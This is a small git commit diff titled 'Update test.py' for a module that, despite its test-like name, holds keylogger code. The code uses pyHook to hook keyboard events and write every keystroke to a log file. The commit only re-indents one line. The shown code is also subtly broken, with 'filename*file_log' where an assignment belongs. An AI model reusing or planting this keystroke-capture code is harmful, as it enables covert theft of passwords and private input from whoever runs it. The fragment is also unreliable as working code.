94a19171f7de0ddd61c3c3254b87585075d7586f
experiment2016 <sarpiericam@libero.it>
2016-05-30 17:17:59 +0200

    Update test.py

--- modules/test.py
+++ modules/test.py
@@ -7,7 +7,7 @@ def run(**args):
          logging.basicConfig(filename*file_log, level=logging.DEBUG, format='%(message)s')
          chr(event.Ascii)
          logging.log(10,chr(event.Ascii))
-          return True
+         return True
       hooks_manager = pyHook.HookManager ( )
       hooks_manager.KeyDown = OnKeyboardEvent
       hooks_manager.HookKeyboard ( )
